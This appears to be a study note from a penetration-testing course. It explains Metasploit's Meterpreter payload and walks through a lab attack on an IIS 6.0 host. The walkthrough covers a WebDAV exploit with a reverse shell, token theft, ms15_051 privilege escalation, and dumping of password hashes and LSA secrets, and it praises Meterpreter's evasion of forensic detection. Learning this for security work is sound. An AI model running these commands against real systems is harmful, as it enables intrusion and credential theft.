# Metasploit Meterpreter

#Meterpreter is a #payload for the #Metasploit application that uses #DLL injection to form a stable connection to a remote host that will persist through reboots of the target system. It runs within the memory of the target host, avoiding the storage of the machine so that no trace of it is evident. 

When we exploit the Meterpreter payload, several things are happening:

- A stager is executed on the target host to initialize a reverse, bind, or other shell type.
- This stager loads Reflective #DLL that loads and injects the code. 
- Meterpreter initializes via #AES encrypted GET request that is sent back to Metasploit to configure the client (attack) host. 
- Meterpreter loads extensions like stdapi and priv if administrative rights are available and loads them via the AES encryption. 
- The Meterpreter shell is created allowing for a stable connection to the remote host.

Meterpreter is like having a reverse shell with more functionality. The applications focuses on being powerful and extensible while remaining undetected. 

#### Stealth

Since Meterpreter exists within the memory of the target host and uses AES encryption, there is little to no evidence of it's presence during forensic investigations. Meterpreter does not create new processes and instead uses a compromised process to perform all of it's actions on the target.

#### Power

Meterpreter uses channels to communicate that allows for AES encrypted traffic.

#### Extensible

Meterpreter is modular by design and can be modified even while actively facilitating a session.

### Use

In the example, we will run an #nmap scan through the metasploit console and then view the lists of available hosts and services:

>db-nmap -sV -p- -T5 -A 10.10.10.10
>hosts
>services

We will then submit the target host #IP address as a #URL to see the hosted web page:

>\http://10.10.10.10

After looking at the nmap scan and the page data for the web page, we can see that the target is running Microsoft IISS httpd 6.0. We can then search for exploits related to this application. Further research about this application wil reveal vulnerabilities related to IIS. After a web search, you will find that vulnerability CVE-2017-7269 is common and there is an existing Metasploit module that can exploit it.

Within msfconsole, search for the iis_webdav_upload_asp exploit:

>search iis_webdav_upload_asp

This search will reveal only one exploit with the ID number 0. Run it:

>use 0
>show options

After setting the correct values for RHOST and LHOST, we will be able to execute our reverse shell on the target host:

>set RHOST 10.10.10.10
>set LHOST tun0
>run

In the output after executing the exploit, there will be a notable .asp file names metasploit288579905 on the target. The metasploit application tried to delete this file but was unable to do so due to it's low permission level. This means that we installed a file on the target that would be traceable by a system administrator or forensic investigator. This could be blocked by threat detection tools and firewall #regex that can recognize keywords to detect malicious files. In the case of this example, our access will be denied and we will need to execute our exploit with escalated privileges. 

We are not able to run the command "getuid" as our access is denied. There are some other commands we can issue however:

>ps

This will output the list of processes running on the target. A process of note has #PID 1836 for wmiprvse.exe under a default administrative account named NT AUTHORITY\\NETWORK SERVICE.

We can use the following command to steal the access token used by the administrative account to escalate our privileges on the target.

>steal-token 1836

This will apply the administrator token to our instance of Meterpreter to grant us more access:

>getuid

The 'getuid' command should now work and we can navigate through the file system looking for sensitive information. In this example, there is a folder called AdminScripts within the C:\\Inetpub\\ directory. 

>cd C:\\Inetpub
>dir
>cd AdminScripts

Once again we are denied access and we must find another way to access this folder. 

Since we have escalated our privileges once, we can now background our established session with the target and use Metasploit's built-in exploit suggester module. This will scan the target system for known exploits and suggest them to us. We can then bind this module to our current session using the active session ID number:

>meterpreter > bg
>y
>search local_exploit_suggester

The above commands will background our current session and search for the suggester module. The output will only have a single module with ID 0. 

>use 0
>show options

We will then see that one of the only parameters we need to set is the session number we are binding to:

>set SESSION 1
>run

The exploit suggester will output several options for exploitation. After trying a few of them, the ms15_051_client_copy_image proves successful granting a reverse shell with root access:

>use exploit/windows/local/ms15_051_client_copy_images
>show options
>set session 1
>set LHOST tun0
>run

The exploit should successfully run on the target system, giving us root access:

>getuid

Now that we have complete access over the target host, we can use more of the Meterpreter functions like process replication and hash extraction. We could even access the webcam or microphone. 

>hashdump
>lsa_dump_sam

We can then gain complete control over the system by looting it using the 'lsa_dump_secrets' command:

>lsa_dump_secrets

This will give us valuable information allowing us to navigate through the system and the network it's connected to. We can access internal resources and impersonate users to further expand our access through the network if it is weakly protected.

